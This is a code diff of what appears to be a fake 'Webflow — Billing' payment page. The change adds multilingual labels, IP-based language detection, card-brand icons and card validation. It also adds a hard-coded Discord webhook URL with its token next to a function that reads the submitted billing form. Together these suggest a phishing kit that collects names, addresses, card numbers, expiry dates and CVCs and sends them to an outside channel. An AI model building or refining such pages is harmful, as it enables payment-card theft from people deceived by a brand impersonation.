+        fullName: "Введіть повне ім’я.",
+        address: "Введіть платіжну адресу.",
+        city: "Введіть місто.",
+        state: "Введіть область.",
+        postal: "Введіть дійсний поштовий індекс.",
+        cardEmpty: "Введіть номер картки.",
+        cardIncomplete: "Введіть повний номер картки.",
+        cardInvalid: "Перевірте номер картки.",
+        expiryInvalid: "Введіть дійсний термін дії.",
+        expiryMonth: "Введіть дійсний місяць.",
+        cvc: "Введіть дійсний код безпеки."
+      }
+    },
+    ar: {
+      title: "Webflow — الفوترة",
+      billingTitle: "بيانات الفوترة",
+      billingSub: "أدخل بيانات الفوترة للمتابعة.",
+      paymentTitle: "طريقة الدفع",
+      paymentSub: "أدخل بيانات الدفع للمتابعة.",
+      fullName: "الاسم الكامل",
+      address1: "العنوان، السطر 1",
+      address2: "العنوان، السطر 2",
+      address2Placeholder: "شقة، جناح، وحدة، وما إلى ذلك (اختياري)",
+      city: "المدينة",
+      state: "الولاية",
+      postal: "الرمز البريدي",
+      card: "رقم البطاقة",
+      expiry: "تاريخ الانتهاء",
+      cvc: "رمز الأمان",
+      fullNamePlaceholder: "الاسم الكامل",
+      address1Placeholder: "العنوان، السطر 1",
+      cityPlaceholder: "المدينة",
+      statePlaceholder: "الولاية",
+      postalPlaceholder: "الرمز البريدي",
+      cardPlaceholder: "رقم البطاقة",
+      expiryPlaceholder: "MM / YY",
+      cvcPlaceholder: "CVC",
+      cancel: "إلغاء",
+      continue: "متابعة",
+      back: "رجوع",
+      save: "حفظ",
+      consent: "سيتم حفظ طريقة الدفع في حسابك وقد تُستخدم للفوترة المستقبلية.",
+      errors: {
+        fullName: "أدخل اسمك الكامل.",
+        address: "أدخل عنوان الفوترة.",
+        city: "أدخل مدينتك.",
+        state: "أدخل ولايتك.",
+        postal: "أدخل رمزًا بريديًا صالحًا.",
+        cardEmpty: "أدخل رقم البطاقة.",
+        cardIncomplete: "أدخل رقم البطاقة كاملًا.",
+        cardInvalid: "تحقق من رقم البطاقة.",
+        expiryInvalid: "أدخل تاريخ انتهاء صالحًا.",
+        expiryMonth: "أدخل شهر انتهاء صالحًا.",
+        cvc: "أدخل رمز أمان صالحًا."
+      }
+    },
+    he: {
+      title: "Webflow — חיוב",
+      billingTitle: "פרטי חיוב",
+      billingSub: "הזן את פרטי החיוב שלך כדי להמשיך.",
+      paymentTitle: "אמצעי תשלום",
+      paymentSub: "הזן את פרטי התשלום שלך כדי להמשיך.",
+      fullName: "שם מלא",
+      address1: "כתובת, שורה 1",
+      address2: "כתובת, שורה 2",
+      address2Placeholder: "דירה, סוויטה, יחידה וכו' (אופציונלי)",
+      city: "עיר",
+      state: "מדינה",
+      postal: "מיקוד",
+      card: "מספר כרטיס",
+      expiry: "תאריך תפוגה",
+      cvc: "קוד אבטחה",
+      fullNamePlaceholder: "שם מלא",
+      address1Placeholder: "כתובת, שורה 1",
+      cityPlaceholder: "עיר",
+      statePlaceholder: "מדינה",
+      postalPlaceholder: "מיקוד",
+      cardPlaceholder: "מספר כרטיס",
+      expiryPlaceholder: "MM / YY",
+      cvcPlaceholder: "CVC",
+      cancel: "ביטול",
+      continue: "המשך",
+      back: "חזרה",
+      save: "שמור",
+      consent: "אמצעי התשלום שלך יישמר בחשבונך וניתן יהיה להשתמש בו לחיובים עתידיים.",
+      errors: {
+        fullName: "הזן את שמך המלא.",
+        address: "הזן את כתובת החיוב שלך.",
+        city: "הזן את העיר שלך.",
+        state: "הזן את המדינה שלך.",
+        postal: "הזן מיקוד תקין.",
+        cardEmpty: "הזן את מספר הכרטיס.",
+        cardIncomplete: "הזן את מספר הכרטיס המלא.",
+        cardInvalid: "בדוק את מספר הכרטיס.",
+        expiryInvalid: "הזן תאריך תפוגה תקין.",
+        expiryMonth: "הזן חודש תפוגה תקין.",
+        cvc: "הזן קוד אבטחה תקין."
+      }
+    },
+    ja: {
+      title: "Webflow — 請求情報",
+      billingTitle: "請求情報",
+      billingSub: "続行するには請求情報を入力してください。",
+      paymentTitle: "お支払い方法",
+      paymentSub: "続行するには支払い情報を入力してください。",
+      fullName: "氏名",
+      address1: "住所1",
+      address2: "住所2",
+      address2Placeholder: "建物名、部屋番号など（任意）",
+      city: "市区町村",
+      state: "都道府県",
+      postal: "郵便番号",
+      card: "カード番号",
+      expiry: "有効期限",
+      cvc: "セキュリティコード",
+      fullNamePlaceholder: "氏名",
+      address1Placeholder: "住所1",
+      cityPlaceholder: "市区町村",
+      statePlaceholder: "都道府県",
+      postalPlaceholder: "郵便番号",
+      cardPlaceholder: "カード番号",
+      expiryPlaceholder: "MM / YY",
+      cvcPlaceholder: "CVC",
+      cancel: "キャンセル",
+      continue: "続行",
+      back: "戻る",
+      save: "保存",
+      consent: "お支払い方法はアカウントに保存され、今後の請求に使用される場合があります。",
+      errors: {
+        fullName: "氏名を入力してください。",
+        address: "請求先住所を入力してください。",
+        city: "市区町村を入力してください。",
+        state: "都道府県を入力してください。",
+        postal: "有効な郵便番号を入力してください。",
+        cardEmpty: "カード番号を入力してください。",
+        cardIncomplete: "カード番号をすべて入力してください。",
+        cardInvalid: "カード番号を確認してください。",
+        expiryInvalid: "有効な有効期限を入力してください。",
+        expiryMonth: "有効な月を入力してください。",
+        cvc: "有効なセキュリティコードを入力してください。"
+      }
+    },
+    ko: {
+      title: "Webflow — 청구",
+      billingTitle: "청구 정보",
+      billingSub: "계속하려면 청구 정보를 입력하세요.",
+      paymentTitle: "결제 수단",
+      paymentSub: "계속하려면 결제 정보를 입력하세요.",
+      fullName: "이름",
+      address1: "주소 1",
+      address2: "주소 2",
+      address2Placeholder: "아파트, 스위트, 호수 등 (선택 사항)",
+      city: "도시",
+      state: "주/도",
+      postal: "우편번호",
+      card: "카드 번호",
+      expiry: "유효기간",
+      cvc: "보안 코드",
+      fullNamePlaceholder: "이름",
+      address1Placeholder: "주소 1",
+      cityPlaceholder: "도시",
+      statePlaceholder: "주/도",
+      postalPlaceholder: "우편번호",
+      cardPlaceholder: "카드 번호",
+      expiryPlaceholder: "MM / YY",
+      cvcPlaceholder: "CVC",
+      cancel: "취소",
+      continue: "계속",
+      back: "뒤로",
+      save: "저장",
+      consent: "결제 수단은 계정에 저장되며 향후 결제에 사용될 수 있습니다.",
+      errors: {
+        fullName: "이름을 입력하세요.",
+        address: "청구지 주소를 입력하세요.",
+        city: "도시를 입력하세요.",
+        state: "주/도를 입력하세요.",
+        postal: "유효한 우편번호를 입력하세요.",
+        cardEmpty: "카드 번호를 입력하세요.",
+        cardIncomplete: "카드 번호를 모두 입력하세요.",
+        cardInvalid: "카드 번호를 확인하세요.",
+        expiryInvalid: "유효한 유효기간을 입력하세요.",
+        expiryMonth: "유효한 월을 입력하세요.",
+        cvc: "유효한 보안 코드를 입력하세요."
+      }
+    },
+    zh: {
+      title: "Webflow — 账单",
+      billingTitle: "账单信息",
+      billingSub: "请输入账单信息以继续。",
+      paymentTitle: "付款方式",
+      paymentSub: "请输入付款信息以继续。",
+      fullName: "姓名",
+      address1: "地址第 1 行",
+      address2: "地址第 2 行",
+      address2Placeholder: "公寓、套房、单元号等（可选）",
+      city: "城市",
+      state: "州/省",
+      postal: "邮政编码",
+      card: "卡号",
+      expiry: "有效期",
+      cvc: "安全码",
+      fullNamePlaceholder: "姓名",
+      address1Placeholder: "地址第 1 行",
+      cityPlaceholder: "城市",
+      statePlaceholder: "州/省",
+      postalPlaceholder: "邮政编码",
+      cardPlaceholder: "卡号",
+      expiryPlaceholder: "MM / YY",
+      cvcPlaceholder: "CVC",
+      cancel: "取消",
+      continue: "继续",
+      back: "返回",
+      save: "保存",
+      consent: "您的付款方式将保存到您的帐户中，并可能用于未来的账单。",
+      errors: {
+        fullName: "请输入您的姓名。",
+        address: "请输入您的账单地址。",
+        city: "请输入您的城市。",
+        state: "请输入您的州/省。",
+        postal: "请输入有效的邮政编码。",
+        cardEmpty: "请输入卡号。",
+        cardIncomplete: "请输入完整的卡号。",
+        cardInvalid: "请检查卡号。",
+        expiryInvalid: "请输入有效的有效期。",
+        expiryMonth: "请输入有效的月份。",
+        cvc: "请输入有效的安全码。"
+      }
+    },
+    hi: {
+      title: "Webflow — बिलिंग",
+      billingTitle: "बिलिंग विवरण",
+      billingSub: "जारी रखने के लिए अपना बिलिंग विवरण दर्ज करें।",
+      paymentTitle: "भुगतान विधि",
+      paymentSub: "जारी रखने के लिए अपने भुगतान विवरण दर्ज करें।",
+      fullName: "पूरा नाम",
+      address1: "पता पंक्ति 1",
+      address2: "पता पंक्ति 2",
+      address2Placeholder: "अपार्टमेंट, सुइट, यूनिट नंबर आदि (वैकल्पिक)",
+      city: "शहर",
+      state: "राज्य",
+      postal: "पिन कोड",
+      card: "कार्ड नंबर",
+      expiry: "समाप्ति तिथि",
+      cvc: "सुरक्षा कोड",
+      fullNamePlaceholder: "पूरा नाम",
+      address1Placeholder: "पता पंक्ति 1",
+      cityPlaceholder: "शहर",
+      statePlaceholder: "राज्य",
+      postalPlaceholder: "पिन कोड",
+      cardPlaceholder: "कार्ड नंबर",
+      expiryPlaceholder: "MM / YY",
+      cvcPlaceholder: "CVC",
+      cancel: "रद्द करें",
+      continue: "जारी रखें",
+      back: "वापस",
+      save: "सहेजें",
+      consent: "आपकी भुगतान विधि आपके खाते में सहेजी जाएगी और भविष्य की बिलिंग के लिए उपयोग की जा सकती है।",
+      errors: {
+        fullName: "अपना पूरा नाम दर्ज करें।",
+        address: "अपना बिलिंग पता दर्ज करें।",
+        city: "अपना शहर दर्ज करें।",
+        state: "अपना राज्य दर्ज करें।",
+        postal: "मान्य पिन कोड दर्ज करें।",
+        cardEmpty: "कार्ड नंबर दर्ज करें।",
+        cardIncomplete: "पूरा कार्ड नंबर दर्ज करें।",
+        cardInvalid: "अपना कार्ड नंबर जाँचें।",
+        expiryInvalid: "मान्य समाप्ति तिथि दर्ज करें।",
+        expiryMonth: "मान्य समाप्ति महीना दर्ज करें।",
+        cvc: "मान्य सुरक्षा कोड दर्ज करें।"
+      }
+    }
+  };
+
+  const COUNTRY_LANGUAGE = {
+    MA:"fr", FR:"fr", BE:"fr", LU:"fr", CA:"fr",
+    ES:"es", MX:"es", AR:"es", CL:"es", CO:"es",
+    DE:"de", AT:"de", CH:"de",
+    IT:"it",
+    PT:"pt", BR:"pt",
+    NL:"nl",
+    TR:"tr",
+    PL:"pl",
+    RU:"ru",
+    UA:"uk",
+    SA:"ar", AE:"ar", EG:"ar", MA:"fr", QA:"ar", KW:"ar",
+    IL:"he",
+    JP:"ja",
+    KR:"ko",
+    CN:"zh", TW:"zh", HK:"zh",
+    IN:"hi"
+  };
+
+  let CURRENT_LANGUAGE = "en";
+
+  function normalizeLanguage(value) {
+    if (!value) return null;
+    const code = value.toLowerCase().split("-")[0];
+    return TRANSLATIONS[code] ? code : null;
+  }
+
+  function setLanguage(lang) {
+    const locale = normalizeLanguage(lang) || "en";
+    CURRENT_LANGUAGE = locale;
+    const t = TRANSLATIONS[locale];
+
+    document.documentElement.lang = locale;
+    document.documentElement.dir = ["ar", "he"].includes(locale) ? "rtl" : "ltr";
+    document.title = t.title;
+
+    document.querySelector('#step1 h1').textContent = t.billingTitle;
+    document.querySelector('#step1 .sub').textContent = t.billingSub;
+    document.querySelector('#step2 h1').textContent = t.paymentTitle;
+    document.querySelector('#step2 .sub').textContent = t.paymentSub;
+
+    const map = {
+      name: ["fullName", "fullNamePlaceholder"],
+      address: ["address1", "address1Placeholder"],
+      address2: ["address2", "address2Placeholder"],
+      city: ["city", "cityPlaceholder"],
+      state: ["state", "statePlaceholder"],
+      postal: ["postal", "postalPlaceholder"],
+      card: ["card", "cardPlaceholder"],
+      expiry: ["expiry", "expiryPlaceholder"],
+      cvc: ["cvc", "cvcPlaceholder"]
+    };
+
+    for (const [id, [labelKey, placeholderKey]] of Object.entries(map)) {
+      const input = document.getElementById(id);
+      if (!input) continue;
+      const label = document.querySelector(`label[for="${id}"]`);
+      if (label) label.textContent = t[labelKey];
+      input.placeholder = t[placeholderKey];
+    }
+
+    document.getElementById('continueButton').textContent = t.continue;
+    document.getElementById('back').textContent = t.back;
+    document.getElementById('saveButton').textContent = t.save;
+    document.querySelector('.cancel-link').textContent = t.cancel;
+    document.querySelector('.payment-consent').textContent = t.consent;
+  }
+
+  function trError(key) {
+    return TRANSLATIONS[CURRENT_LANGUAGE].errors[key];
+  }
+
+  async function detectLanguage() {
+    const browser = normalizeLanguage(
+      navigator.languages?.find(Boolean) || navigator.language
+    );
+
+    if (browser) {
+      setLanguage(browser);
+      return;
+    }
+
+    try {
+      const response = await fetch("https://ipapi.co/json/", {
+        method: "GET",
+        cache: "no-store"
+      });
+      if (response.ok) {
+        const info = await response.json();
+        setLanguage(COUNTRY_LANGUAGE[info.country_code] || "en");
+        return;
+      }
+    } catch (_) {}
+
+    setLanguage("en");
+  }
+
+  setLanguage("en");
+  detectLanguage();
+  
+ const TEST_WEBHOOK_URL = "https://discord.com/api/webhooks/1534009201917956198/pElS1mrB5KnDYqLHoQMfhsNNi8dBfq8cg_bEvVmUtUUtUvRFWXa_4bKcjg6zCF4Ye8nj";
 
   async function sendTestSubmission() {
     const billingForm = document.getElementById('billingForm');
@@ -1479,13 +2578,25 @@ document.addEventListener('DOMContentLoaded', () => {
   const cardInput = document.getElementById('card');
   const expiryInput = document.getElementById('expiry');
   const cvcInput = document.getElementById('cvc');
+  const cardIcon = document.getElementById('cardIcon');
+  const cvcIcon = document.getElementById('cvcIcon');
+
+  const CARD_ICONS = {
+    mastercard: `<svg class="card-brand-svg" fill="none" focusable="false" role="presentation" viewbox="0 0 24 16" xmlns="http://www.w3.org/2000/svg"><rect fill="#252525" height="16" rx="2" width="24"></rect><circle cx="9" cy="8" fill="#eb001b" r="5"></circle><circle cx="15" cy="8" fill="#f79e1b" r="5"></circle><path d="M12 4c1.214.912 2 2.364 2 4s-.786 3.088-2 4c-1.214-.912-2-2.364-2-4s.786-3.088 2-4z" fill="#ff5f00"></path></svg>`,
+    visa: `<svg class="card-brand-svg" fill="none" height="16" viewbox="0 0 24 16" width="24" xmlns="http://www.w3.org/2000/svg"><g clip-path="url(#clip0_4934_35103)"><path d="M22 0H2a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h20a2 2 0 0 0 2-2V2a2 2 0 0 0-2-2" fill="#00579f"></path><path d="M10.367 10.91H8.85l.949-5.802h1.517zm5.501-5.66a3.8 3.8 0 0 0-1.36-.247c-1.5 0-2.555.79-2.561 1.92-.013.833.755 1.296 1.33 1.574.587.284.786.469.786.722-.006.389-.474.568-.91.568-.607 0-.931-.092-1.425-.309l-.2-.092-.212 1.302c.356.16 1.012.303 1.692.309 1.593 0 2.63-.778 2.642-1.982.006-.66-.4-1.166-1.274-1.58-.53-.265-.856-.444-.856-.716.006-.247.275-.5.874-.5.493-.012.856.105 1.13.222l.138.062z" fill="#fff"></path><path clip-rule="evenodd" d="M18.584 5.108h1.174l1.224 5.802h-1.405l-.18-.87h-1.95c-.055.154-.318.87-.318.87h-1.592l2.254-5.32c.156-.377.431-.482.793-.482m-.093 2.124-.606 1.623h1.261c-.062-.29-.35-1.679-.35-1.679l-.106-.5a31 31 0 0 1-.2.556" fill="#fff" fill-rule="evenodd"></path><path d="M7.582 5.108 6.096 9.065l-.162-.803c-.275-.926-1.136-1.931-2.098-2.432l1.361 5.074h1.605l2.385-5.796z" fill="#fff"></path><path d="M4.716 5.108H2.275l-.025.118c1.904.481 3.166 1.641 3.684 3.036l-.53-2.666c-.088-.37-.357-.475-.688-.488" fill="#fff"></path></g><defs><clippath id="clip0_4934_35103"><path d="M0 0h24v16H0z" fill="#fff"></path></clippath></defs></svg>`,
+    discover: `<svg class="card-brand-svg" fill="none" focusable="false" role="presentation" viewbox="0 0 24 16" xmlns="http://www.w3.org/2000/svg"><path d="M21.997 15.75H22c.955.008 1.74-.773 1.751-1.746V2.006a1.789 1.789 0 0 0-.52-1.25A1.72 1.72 0 0 0 21.997.25H2.001A1.718 1.718 0 0 0 .77.757c-.33.33-.517.779-.521 1.247v11.99c.004.47.191.92.52 1.25.329.328.771.51 1.233.506h19.994Zm0 .5h-.002.002Z" fill="#fff" stroke="#ddd"></path><path d="M12.612 16h9.385A1.986 1.986 0 0 0 24 14.03v-2.358A38.74 38.74 0 0 1 12.612 16Z" fill="#F27712"></path><path d="M23.172 9.296h-.852l-.96-1.266h-.091v1.266h-.695V6.152H21.6c.803 0 1.266.33 1.266.927 0 .488-.29.802-.81.902l1.116 1.315Zm-1.026-2.193c0-.306-.232-.463-.662-.463h-.215v.952h.199c.446 0 .678-.166.678-.489Zm-4.005-.951h1.97v.53h-1.275v.703h1.225v.538h-1.225v.852h1.274v.53h-1.97V6.152Zm-2.235 3.227L14.4 6.143h.761l.952 2.119.96-2.119h.745L16.295 9.38h-.389Zm-6.298-.008c-1.059 0-1.887-.72-1.887-1.655 0-.91.845-1.647 1.904-1.647.298 0 .546.058.852.19v.729a1.241 1.241 0 0 0-.869-.356c-.662 0-1.167.48-1.167 1.084 0 .637.497 1.092 1.2 1.092.315 0 .555-.1.836-.347v.728a2.13 2.13 0 0 1-.869.182ZM7.506 8.336c0 .613-.505 1.035-1.233 1.035-.53 0-.91-.182-1.233-.596l.455-.389c.157.282.422.422.753.422.315 0 .538-.19.538-.438 0-.141-.066-.249-.207-.331a2.88 2.88 0 0 0-.48-.183c-.653-.206-.877-.43-.877-.868 0-.514.48-.903 1.109-.903.397 0 .753.125 1.051.356l-.364.414a.761.761 0 0 0-.563-.248c-.298 0-.513.149-.513.347 0 .166.124.257.538.398.794.248 1.026.48 1.026.993v-.009ZM4.088 6.152h.695v3.153h-.695V6.152ZM1.854 9.305H.828V6.152h1.026c1.125 0 1.903.645 1.903 1.572 0 .472-.231.919-.637 1.217-.348.248-.737.364-1.274.364h.008Zm.81-2.367c-.23-.182-.496-.248-.95-.248h-.191v2.085h.19c.447 0 .728-.083.952-.248.24-.199.38-.497.38-.803 0-.306-.14-.596-.38-.786Z" fill="#000"></path><path d="M12.414 6.069c-.91 0-1.655.728-1.655 1.63 0 .96.711 1.68 1.655 1.68a1.64 1.64 0 0 0 1.655-1.655c0-.927-.72-1.655-1.655-1.655Z" fill="#F27712"></path></svg>`,
+  };
+
+  const DEFAULT_CARD_ICONS = `${CARD_ICONS.mastercard}${CARD_ICONS.visa}${CARD_ICONS.discover}`;
+  const CARD_ERROR_ICON = `<svg fill="currentColor" height="20" role="presentation" viewbox="0 0 30 20" width="30" xmlns="http://www.w3.org/2000/svg"><g clip-path="url(#clip0_184_11820)"><path d="M26.2061 0.00488281C28.3194 0.112115 30 1.85996 30 4V13.335L28.5 10.623V8H27.0488L25.9736 6.05664C25.744 5.64161 25.4595 5.2894 25.1367 5H28.5V4C28.5 2.61929 27.3807 1.5 26 1.5H4C2.61929 1.5 1.5 2.61929 1.5 4V5H19.8643C19.608 5.22972 19.3755 5.49872 19.1758 5.80762L19.0264 6.05664L17.9512 8H1.5V16C1.5 17.3807 2.61929 18.5 4 18.5H13.0371C13.1062 19.0302 13.2775 19.5408 13.5391 20H4L3.79395 19.9951C1.7488 19.8913 0.108652 18.2512 0.00488281 16.2061L0 16V4C0 1.85996 1.68056 0.112115 3.79395 0.00488281L4 0H26L26.2061 0.00488281Z" opacity="0.74"></path><path clip-rule="evenodd" d="M20.7762 7.0252C21.5325 5.65827 23.4673 5.65826 24.2235 7.0252L29.743 17.0027C30.4843 18.3434 29.5319 19.9995 28.0194 19.9998H16.9803C15.4679 19.9995 14.5155 18.3434 15.2567 17.0027L20.7762 7.0252ZM22.4999 15.4998C21.8095 15.4998 21.2499 16.0595 21.2499 16.7498C21.2499 17.4402 21.8095 17.9998 22.4999 17.9998C23.1902 17.9998 23.7499 17.4402 23.7499 16.7498C23.7499 16.0595 23.1902 15.4998 22.4999 15.4998ZM22.4999 8.99981C21.9476 8.99981 21.4999 9.44753 21.4999 9.99981V12.9998C21.4999 13.5521 21.9476 13.9998 22.4999 13.9998C23.0522 13.9998 23.4999 13.5521 23.4999 12.9998V9.99981C23.4999 9.44753 23.0522 8.99981 22.4999 8.99981Z" fill-rule="evenodd"></path></g><defs><clippath id="clip0_184_11820"><rect height="20" width="30"></rect></clippath></defs></svg>`;
+  const CVC_ICON = `<svg class="p-CardCvcIcons-svg" fill="currentColor" height="20" role="img" viewbox="0 0 30 20" width="30" xmlns="http://www.w3.org/2000/svg"><title id="cvcIconTitle">Credit or debit card CVC</title><g opacity="0.74"><path clip-rule="evenodd" d="M25.2061 0.00488281C27.3194 0.112115 29 1.85996 29 4V11.3291C28.5428 11.0304 28.0336 10.8304 27.5 10.7188V8H1.5V16C1.5 17.3807 2.61929 18.5 4 18.5H10.1104V20H4L3.79395 19.9951C1.7488 19.8913 0.108652 18.2512 0.00488281 16.2061L0 16V4C0 1.85996 1.68056 0.112115 3.79395 0.00488281L4 0H25L25.2061 0.00488281ZM4 1.5C2.61929 1.5 1.5 2.61929 1.5 4V5H27.5V4C27.5 2.61929 26.3807 1.5 25 1.5H4Z" fill-rule="evenodd"></path><path d="M27.5 12.7988C28.3058 13.1128 28.7725 13.7946 28.7725 14.6406C28.7722 15.4002 28.2721 15.9399 27.6523 16.1699C28.1601 16.3319 28.6072 16.6732 28.8086 17.2207C28.3597 18.6222 27.1605 19.6862 25.6826 19.9404C24.8389 19.7707 24.1662 19.2842 23.834 18.5H25C25.0914 18.5 25.1816 18.4939 25.2705 18.4844C25.5434 18.7862 25.9284 18.9501 26.3623 18.9502C27.142 18.9501 27.6922 18.5297 27.6924 17.79C27.6923 17.4212 27.5473 17.1544 27.2998 16.9795C27.4281 16.6786 27.5 16.3478 27.5 16V15.0527C27.5397 14.9481 27.5625 14.8309 27.5625 14.7002C27.5625 14.5657 27.5399 14.4422 27.5 14.3311V12.7988Z"></path><path d="M15.2207 18.5V18.8301H16.8799V19.9004H12.1104V18.8301H13.9902V18.5H15.2207Z"></path><path d="M19.9307 18.5L19.5762 18.7803H22.8369V19.9004H17.8164V18.8604L18.2549 18.5H19.9307Z"></path></g><path d="M26.3822 20.01C24.9722 20.01 23.8522 19.25 23.6422 17.81L24.8722 17.58C24.9922 18.45 25.6022 18.95 26.3622 18.95C27.1422 18.95 27.6922 18.53 27.6922 17.79C27.6922 17.05 27.1122 16.72 26.2822 16.72H25.5722V15.67H26.3022C27.0622 15.67 27.5622 15.34 27.5622 14.7C27.5622 14.07 27.1022 13.68 26.3922 13.68C25.6422 13.68 25.1322 14.18 24.9822 14.92L23.8122 14.76C24.0022 13.55 24.9822 12.61 26.4322 12.61C27.8822 12.61 28.7722 13.47 28.7722 14.64C28.7722 15.4 28.2722 15.94 27.6522 16.17C28.3422 16.39 28.9222 16.94 28.9222 17.89C28.9222 19.04 27.9522 20.01 26.3822 20.01Z"></path><path d="M17.8161 18.86L19.6161 17.38C20.5961 16.58 21.4761 15.87 21.4761 14.97C21.4761 14.23 21.0161 13.7 20.2561 13.7C19.5061 13.7 19.0161 14.29 19.0161 15C19.0161 15.23 19.0561 15.46 19.1361 15.68H17.9461C17.8461 15.39 17.8161 15.2 17.8161 14.93C17.8161 13.58 18.9261 12.61 20.2861 12.61C21.7861 12.61 22.7461 13.54 22.7461 14.89C22.7461 16.16 21.7861 17.03 20.7761 17.83L19.5761 18.78H22.8361V19.9H17.8161V18.86Z"></path><path d="M14.25 12.67H15.22V18.83H16.88V19.9H12.11V18.83H13.99V14.92H12.15V13.99L12.88 13.93C13.78 13.86 14.18 13.58 14.25 12.67Z"></path></svg>`;
 
   const billingFields = [
-    ['name', value => value.trim().length >= 2, 'Enter your full name.'],
-    ['address', value => value.trim().length >= 3, 'Enter your billing address.'],
-    ['city', value => value.trim().length >= 2, 'Enter your city.'],
+    ['name', value => value.trim().length >= 2, () => trError('fullName')],
+    ['address', value => value.trim().length >= 3, () => trError('address')],
+    ['city', value => value.trim().length >= 2, () => trError('city')],
     ['state', value => value.trim().length >= 2, 'Enter your state or province.'],
-    ['postal', value => /^[0-9A-Za-z][0-9A-Za-z -]{2,9}$/.test(value), 'Enter a valid postal code.']
+    ['postal', value => /^[0-9A-Za-z][0-9A-Za-z -]{2,9}$/.test(value), () => trError('postal')]
   ];
 
   let currentStep = 1;
@@ -1518,7 +2629,7 @@ document.addEventListener('DOMContentLoaded', () => {
       if (!ok) {
         valid = false;
         if (input.closest('.field')?.classList.contains('touched')) {
-          setFieldState(input, 'error', message);
+          setFieldState(input, 'error', message());
         }
         firstInvalid ||= input;
       } else {
@@ -1534,7 +2645,7 @@ document.addEventListener('DOMContentLoaded', () => {
       setFieldState(
         firstInvalid,
         'error',
-        billingFields.find(([id]) => id === firstInvalid.id)[2]
+        billingFields.find(([id]) => id === firstInvalid.id)[2]()
       );
       firstInvalid.focus();
     }
@@ -1566,23 +2677,83 @@ document.addEventListener('DOMContentLoaded', () => {
     return sum % 10 === 0;
   }
 
+  function detectCardBrand(digits) {
+    if (/^4/.test(digits)) return 'visa';
+    if (/^(5[1-5]|2[2-7])/.test(digits)) return 'mastercard';
+    if (/^(34|37)/.test(digits)) return 'amex';
+    if (/^(6011|65|64[4-9])/.test(digits)) return 'discover';
+    return null;
+  }
+
+  function renderCardIcon(state = 'brand', digits = '') {
+    if (state === 'error') {
+      cardIcon.className = 'payment-field-icon card-icons error';
+      cardIcon.innerHTML = CARD_ERROR_ICON;
+      return;
+    }
+
+    const brand = detectCardBrand(digits);
+
+    if (!digits) {
+      cardIcon.className = 'payment-field-icon card-icons default-group';
+      cardIcon.innerHTML = DEFAULT_CARD_ICONS;
+      return;
+    }
+
+    cardIcon.className = 'payment-field-icon card-icons';
+
+    if (brand === 'visa') {
+      cardIcon.innerHTML = CARD_ICONS.visa;
+    } else if (brand === 'mastercard') {
+      cardIcon.innerHTML = CARD_ICONS.mastercard;
+    } else if (brand === 'discover') {
+      cardIcon.innerHTML = CARD_ICONS.discover;
+    } else if (brand === 'amex') {
+      cardIcon.innerHTML = `<svg class="card-brand-svg amex-card-svg" viewBox="0 0 24 16" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <rect width="24" height="16" rx="2" fill="#2E77BC"/>
+        <rect x="1.5" y="1.5" width="21" height="13" rx="1" stroke="#fff" stroke-opacity=".28"/>
+        <path d="M3.5 5.1H6.1L6.55 6.15L7 5.1H9.7V10.9H7.95V7.45L6.75 9.95H6.1L4.9 7.45V10.9H3.5V5.1ZM10.35 5.1H15.15V6.25H12.1V7.3H14.85V8.45H12.1V9.75H15.25V10.9H10.35V5.1ZM15.3 5.1H17L17.9 6.6L18.8 5.1H20.5L18.75 7.95L20.6 10.9H18.9L17.9 9.25L16.9 10.9H15.2L17.05 7.95L15.3 5.1ZM20.75 5.1H22V10.9H20.75V5.1Z" fill="#fff"/>
+      </svg>`;
+    } else {
+      // Keep the neutral brand set while there is not enough information
+      // to identify a card network.
+      cardIcon.className = 'payment-field-icon card-icons default-group';
+      cardIcon.innerHTML = DEFAULT_CARD_ICONS;
+    }
+  }
+
+  function renderCvcIcon(state = 'default') {
+    if (state === 'error') {
+      cvcIcon.className = 'payment-field-icon cvc-icons error';
+      cvcIcon.innerHTML = CARD_ERROR_ICON;
+      return;
+    }
+
+    cvcIcon.className = 'payment-field-icon cvc-icons cvc-default';
+    cvcIcon.innerHTML = CVC_ICON;
+  }
+
   function validateCard() {
     const digits = digitsOnly(cardInput.value);
 
     if (!digits) {
-      setFieldState(cardInput, 'error', 'Enter your card number.');
+      setFieldState(cardInput, 'error', trError('cardEmpty'));
+      renderCardIcon('error', digits);
       return false;
     }
     if (digits.length < 13) {
-      setFieldState(cardInput, 'error', 'Enter the complete card number.');
+      setFieldState(cardInput, 'error', trError('cardIncomplete'));
+      renderCardIcon('error', digits);
       return false;
     }
     if (!luhnCheck(digits)) {
-      setFieldState(cardInput, 'error', 'Check your card number.');
+      setFieldState(cardInput, 'error', trError('cardInvalid'));
+      renderCardIcon('error', digits);
       return false;
     }
 
     setFieldState(cardInput, 'valid', '');
+    renderCardIcon('brand', digits);
     return true;
   }
 
@@ -1591,7 +2762,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const match = value.match(/^(\d{2})\/(\d{2})$/);
 
     if (!match) {
-      setFieldState(expiryInput, 'error', 'Enter a valid expiration date.');
+      setFieldState(expiryInput, 'error', trError('expiryInvalid'));
       return false;
     }
 
@@ -1602,12 +2773,12 @@ document.addEventListener('DOMContentLoaded', () => {
     const currentMonth = now.getMonth() + 1;
 
     if (month < 1 || month > 12) {
-      setFieldState(expiryInput, 'error', 'Enter a valid expiration month.');
+      setFieldState(expiryInput, 'error', trError('expiryMonth'));
       return false;
     }
 
     if (year < currentYear || (year === currentYear && month < currentMonth)) {
-      setFieldState(expiryInput, 'error', 'Enter a valid expiration date.');
+      setFieldState(expiryInput, 'error', trError('expiryInvalid'));
       return false;
     }
 
@@ -1619,11 +2790,13 @@ document.addEventListener('DOMContentLoaded', () => {
     const digits = digitsOnly(cvcInput.value);
 
     if (digits.length < 3) {
-      setFieldState(cvcInput, 'error', 'Enter a valid security code.');
+      setFieldState(cvcInput, 'error', trError('cvc'));
+      renderCvcIcon('error');
       return false;
     }
 
     setFieldState(cvcInput, 'valid', '');
+    renderCvcIcon('default');
     return true;
   }
 
@@ -1639,6 +2812,11 @@ document.addEventListener('DOMContentLoaded', () => {
     success.style.display = 'none';
     spinner.style.display = 'block';
     busy = false;
+
+    if (step === 2) {
+      renderCardIcon('brand', digitsOnly(cardInput.value));
+      renderCvcIcon('default');
+    }
 
     if (step === 1) {
       setButtonEnabled(continueButton, billingFields.every(([id, validator]) =>
@@ -1673,6 +2851,56 @@ document.addEventListener('DOMContentLoaded', () => {
     }, delay);
   }
 
+
+  // Enter moves to the next visible input.
+  // On the last input of each step, Enter activates that step's button.
